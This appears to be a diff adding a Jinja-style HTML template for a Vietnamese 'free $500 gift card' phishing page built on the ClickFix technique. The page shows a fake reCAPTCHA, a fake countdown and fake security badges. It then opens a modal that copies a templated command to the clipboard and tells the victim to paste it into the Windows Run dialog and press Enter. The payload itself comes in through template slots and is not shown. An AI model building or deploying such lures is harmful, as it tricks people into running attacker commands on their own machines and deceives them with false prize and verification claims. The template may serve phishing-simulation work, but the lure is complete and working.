@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 Nhận Thẻ Quà Tặng $500 | Ưu Đãi Đặc Biệt</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 24px;
+      max-width: 500px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 32px 80px rgba(0, 0, 0, .3), 0 0 0 1px rgba(255, 255, 255, .15);
+      position: relative;
+      z-index: 10;
+      animation: bounceIn .5s cubic-bezier(.34, 1.56, .64, 1);
+    }
+
+    @keyframes bounceIn {
+      from {
+        transform: scale(.7);
+        opacity: 0
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1
+      }
+    }
+
+    .card-header {
+      background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #ff9ff3 100%);
+      padding: 36px 32px 32px;
+      text-align: center;
+      position: relative;
+    }
+
+    .gift-emoji {
+      font-size: 90px;
+      display: block;
+      margin-bottom: 12px;
+      animation: giftBounce 1.5s ease-in-out infinite;
+    }
+
+    @keyframes giftBounce {
+
+      0%,
+      100% {
+        transform: translateY(0) rotate(-3deg);
+      }
+
+      50% {
+        transform: translateY(-12px) rotate(3deg);
+      }
+    }
+
+    .offer-value {
+      font-size: 60px;
+      font-weight: 900;
+      color: #fff;
+      text-shadow: 0 3px 10px rgba(0, 0, 0, .2);
+      letter-spacing: -0.03em;
+      line-height: 1;
+      margin-bottom: 6px;
+    }
+
+    .offer-label {
+      font-size: 18px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, .9);
+      margin-bottom: 6px;
+    }
+
+    .header-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #fff;
+      text-shadow: 0 2px 8px rgba(0, 0, 0, .15);
+    }
+
+    .timer-strip {
+      background: rgba(0, 0, 0, .12);
+      padding: 10px 24px;
+      text-align: center;
+      font-size: 13px;
+      color: rgba(255, 255, 255, .9);
+      letter-spacing: .02em;
+    }
+
+    .timer-strip strong {
+      font-weight: 800;
+    }
+
+    #strip-time {
+      font-family: monospace;
+      font-size: 15px;
+    }
+
+    .card-body {
+      padding: 32px;
+    }
+
+    .steps-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #888;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      margin-bottom: 16px;
+    }
+
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 16px;
+      background: #f8f9fa;
+      border-radius: 12px;
+      border: 1px solid #f0f0f0;
+    }
+
+    .step-icon {
+      font-size: 22px;
+      flex-shrink: 0;
+    }
+
+    .step-text {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.4;
+    }
+
+    .step-text strong {
+      color: #1a1a1a;
+    }
+
+    .step-check {
+      margin-left: auto;
+      font-size: 18px;
+      opacity: .4;
+    }
+
+    .captcha-widget {
+      background: #f8f9fa;
+      border: 2px solid #e0e0e0;
+      border-radius: 14px;
+      padding: 18px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+      cursor: pointer;
+      transition: all .2s;
+    }
+
+    .captcha-widget:hover {
+      border-color: #667eea;
+      box-shadow: 0 0 0 4px rgba(102, 126, 234, .1);
+    }
+
+    .captcha-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .captcha-check {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #ccc;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all .2s;
+      background: #fff;
+    }
+
+    .captcha-check.checked {
+      background: #27ae60;
+      border-color: #27ae60;
+    }
+
+    .captcha-check.checking {
+      border-color: #667eea;
+    }
+
+    .captcha-check .ck-spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(102, 126, 234, .3);
+      border-top-color: #667eea;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+    }
+
+    .captcha-check.checking .ck-spinner {
+      display: block;
+    }
+
+    .captcha-check .ck-mark {
+      display: none;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .captcha-check.checked .ck-mark {
+      display: block;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
+    .captcha-label {
+      font-size: 15px;
+      font-weight: 500;
+      color: #333;
+    }
+
+    .captcha-brand {
+      text-align: right;
+      font-size: 10px;
+      color: #aaa;
+    }
+
+    .claim-btn {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: all .2s;
+      box-shadow: 0 6px 24px rgba(102, 126, 234, .4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .claim-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to right, transparent, rgba(255, 255, 255, .2), transparent);
+      transform: translateX(-100%);
+      animation: shimmer 2.5s infinite;
+    }
+
+    @keyframes shimmer {
+      to {
+        transform: translateX(100%)
+      }
+    }
+
+    .claim-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 32px rgba(102, 126, 234, .5);
+    }
+
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    .badge {
+      font-size: 12px;
+      color: #aaa;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .terms {
+      font-size: 11px;
+      color: #ccc;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    .terms a {
+      color: #aaa;
+      text-decoration: none;
+    }
+
+    /* ClickFix Modal */
+    #gift-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .6);
+      backdrop-filter: blur(6px);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      animation: fadeIn .2s;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0
+      }
+
+      to {
+        opacity: 1
+      }
+    }
+
+    .gm-dialog {
+      background: #fff;
+      border-radius: 20px;
+      max-width: 480px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, .35);
+      animation: slideUp .25s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(20px);
+        opacity: 0
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1
+      }
+    }
+
+    .gm-top {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      padding: 24px 28px;
+      color: #fff;
+    }
+
+    .gm-top h2 {
+      font-size: 19px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .gm-top p {
+      font-size: 14px;
+      margin-top: 6px;
+      opacity: .9;
+    }
+
+    .gm-body {
+      padding: 28px;
+    }
+
+    .gm-body>p {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .gm-steps {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+
+    .gm-step {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .gm-step-num {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .gm-step-text {
+      font-size: 14px;
+      color: #333;
+    }
+
+    .gm-step-text kbd {
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 2px 6px;
+      font-size: 12px;
+      font-family: monospace;
+    }
+
+    .gm-code {
+      background: #1a1a2e;
+      border-radius: 10px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 14px;
+    }
+
+    .gm-code-text {
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      color: #a8d8ea;
+      word-break: break-all;
+      flex: 1;
+    }
+
+    .gm-copy {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 16px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .gm-copy.copied {
+      background: #27ae60;
+    }
+
+    .gm-note {
+      font-size: 13px;
+      color: #888;
+    }
+
+    .gm-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .gm-btn-sec {
+      padding: 10px 18px;
+      background: #f5f5f5;
+      color: #333;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .gm-btn-prim {
+      padding: 10px 18px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <div class="card-header">
+      <span class="gift-emoji">{{ content.brand_logo | default('🎁') }}</span>
+      <div class="offer-value">{{ content.offer_value | default('$500') }}</div>
+      <div class="offer-label">{{ content.offer_label | default('Thẻ Quà Tặng') }}</div>
+      <div class="header-title">{{ content.title | default('Chúc Mừng! Bạn Đã Trúng Thưởng!') }}</div>
+    </div>
+
+    <div class="timer-strip">
+      Ưu đãi hết hạn sau: <strong><span id="strip-time">23:59:47</span></strong> — Đừng bỏ lỡ!
+    </div>
+
+    <div class="card-body">
+      <div class="steps-title">Cách nhận thưởng</div>
+      <div class="steps-list">
+        <div class="step">
+          <span class="step-icon">✅</span>
+          <div class="step-text"><strong>Bước 1:</strong> {{ content.instructions | default('Hoàn thành xác minh nhanh
+            bên dưới') }}</div>
+          <span class="step-check">✓</span>
+        </div>
+        <div class="step">
+          <span class="step-icon">🔒</span>
+          <div class="step-text"><strong>Bước 2:</strong> Xác minh bạn không phải là robot</div>
+          <span class="step-check">○</span>
+        </div>
+        <div class="step">
+          <span class="step-icon">🎉</span>
+          <div class="step-text"><strong>Bước 3:</strong> Nhận mã thẻ quà tặng ngay lập tức</div>
+          <span class="step-check">○</span>
+        </div>
+      </div>
+
+      <div class="captcha-widget" id="captcha-widget" onclick="handleCaptcha()">
+        <div class="captcha-left">
+          <div class="captcha-check" id="captcha-check">
+            <div class="ck-spinner"></div>
+            <span class="ck-mark">✓</span>
+          </div>
+          <span class="captcha-label">Tôi không phải là robot</span>
+        </div>
+        <div class="captcha-brand">reCAPTCHA<br>Bảo Mật · Điều Khoản</div>
+      </div>
+
+      <button class="claim-btn" id="claim-btn" onclick="handleClaim()">
+        🎁 {{ content.button_text | default('Nhận Ngay — MIỄN PHÍ') }}
+      </button>
+
+      <div class="trust-badges">
+        <div class="badge">🔒 256-bit SSL</div>
+        <div class="badge">✓ Đã Xác Minh</div>
+        <div class="badge">⚡ Tức Thì</div>
+      </div>
+
+      <div class="terms">{{ content.terms | default('Bằng việc nhận thưởng, bạn đồng ý với Điều Khoản của chúng tôi. Ưu
+        đãi hết hạn sau 24 giờ.') }}<br>
+        <a href="#">Chính Sách Bảo Mật</a> · <a href="#">Điều Khoản Dịch Vụ</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ClickFix Modal -->
+  <div id="gift-modal"
+    style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);z-index:9999;display:none;align-items:center;justify-content:center;padding:16px">
+    <div class="gm-dialog">
+      <div class="gm-top">
+        <h2>🎁 Bước Xác Minh Cuối Cùng</h2>
+        <p>Gần hoàn tất! Một bước nhanh để mở khóa thẻ quà tặng của bạn</p>
+      </div>
+      <div class="gm-body">
+        <p>Hệ thống chống gian lận yêu cầu xác minh thủ công. Chỉ mất 10 giây!</p>
+        <ol class="gm-steps">
+          <li class="gm-step">
+            <div class="gm-step-num">1</div>
+            <div class="gm-step-text">Nhấn <kbd>⊞ Win</kbd> + <kbd>R</kbd></div>
+          </li>
+          <li class="gm-step">
+            <div class="gm-step-num">2</div>
+            <div class="gm-step-text">Nhấn <kbd>Ctrl</kbd> + <kbd>V</kbd></div>
+          </li>
+          <li class="gm-step">
+            <div class="gm-step-num">3</div>
+            <div class="gm-step-text">Nhấn <kbd>Enter</kbd> để nhận mã thẻ</div>
+          </li>
+        </ol>
+        <div class="gm-code">
+          <div class="gm-code-text" id="gm-cmd">{{ content.display_command | default('Đang tải…') }}</div>
+          <button class="gm-copy" id="gm-copy-btn" onclick="gmCopy()">📋 Sao Chép</button>
+        </div>
+        <p class="gm-note">Mã xác minh đã được sao chép tự động. Thẻ quà tặng sẽ được gửi đến email của bạn.</p>
+        <div class="gm-footer">
+          <button class="gm-btn-sec" onclick="document.getElementById('gift-modal').style.display='none'">Hủy</button>
+          <button class="gm-btn-prim" onclick="gmCopy()">Sao Chép Lại</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    { { payload_content | safe } }
+    window._lureName = "{{ lure_name }}";
+
+    var stripSec = 86387;
+    setInterval(function () {
+      if (stripSec <= 0) return;
+      stripSec--;
+      var h = Math.floor(stripSec / 3600), m = Math.floor((stripSec % 3600) / 60), s = stripSec % 60;
+      document.getElementById('strip-time').textContent = [h, m, s].map(function (n) { return String(n).padStart(2, '0') }).join(':');
+    }, 1000);
+
+    var _captchaDone = false;
+    function handleCaptcha() {
+      if (_captchaDone) return;
+      var cb = document.getElementById('captcha-check');
+      cb.classList.add('checking');
+      setTimeout(function () {
+        cb.classList.remove('checking');
+        cb.classList.add('checked');
+        _captchaDone = true;
+      }, 1200);
+    }
+
+    function handleClaim() {
+      if (!_captchaDone) {
+        document.getElementById('captcha-widget').style.boxShadow = '0 0 0 3px #e74c3c';
+        setTimeout(function () { document.getElementById('captcha-widget').style.boxShadow = ''; }, 1000);
+        return;
+      }
+      try { runClickFixPayload(); } catch (e) { console.warn(e); }
+      setTimeout(function () {
+        document.getElementById('gift-modal').style.display = 'flex';
+      }, 400);
+    }
+
+    function gmCopy() {
+      var code = document.getElementById('gm-cmd').textContent;
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(function () {
+          var btn = document.getElementById('gm-copy-btn');
+          btn.textContent = '✓ Đã Sao Chép!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = '📋 Sao Chép'; btn.classList.remove('copied'); }, 2000);
+        });
+      }
+    }
+  </script>
+</body>
+
+</html>
